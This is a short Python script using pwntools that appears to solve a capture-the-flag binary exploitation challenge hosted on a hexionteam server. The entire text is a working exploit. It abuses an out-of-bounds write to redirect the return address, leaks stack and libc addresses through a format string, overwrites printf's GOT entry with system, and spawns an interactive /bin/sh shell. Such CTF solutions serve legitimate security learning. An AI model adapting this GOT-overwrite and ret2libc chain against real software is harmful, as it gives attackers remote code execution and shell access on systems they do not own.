from pwn import *

local = False
p = process('./www') if local else remote('challenges1.hexionteam.com', 3002)

elf = ELF('./www')
main_func = elf.functions['main'] 

def write(what, where, last=False):
	p.sendline('-7\n' + chr(len(what) + (0 if last else 1)))
	msg = b''
	for c in what:
		msg += str(where).encode() + b'\n' + bytes([c]) + b'\n'
		where += 1
	print(msg)
	p.send(msg)

# ret to ret (because stack alignment) and then to main, also leak printf got entry and stack mapping
write(p64(elf.got['printf']), 0x2d + 16) # printf got addr for leak
write(p64(main_func.address), 0x2d + 8) # RIP(2) -> ret back to main
write(p64(main_func.address + main_func.size - 1), 0x2d) # RIP(1) -> ret to ret
write(b"%10$llx %15$s\x00", 0, True) # leak stack and libc

# process leaks
leak = p.recv().split()
buff_start = int(leak[0], 16) - 245 		# beginning user input buffer
offset = buff_start - elf.got['printf'] 	# distance between start of buffer to printf@got
printf_addr = int.from_bytes(leak[1], 'little')

# calculate system address using leaks
lib = ELF('./libc')
sys_addr = printf_addr + (lib.functions['system'].address - lib.functions['printf'].address)
print(hex(buff_start), hex(printf_addr), hex(sys_addr), leak)

# write address of system into printf@got
write(p64(sys_addr)[:3], -offset)
write(b'/bin/sh\x00', 0, True)
p.interactive()
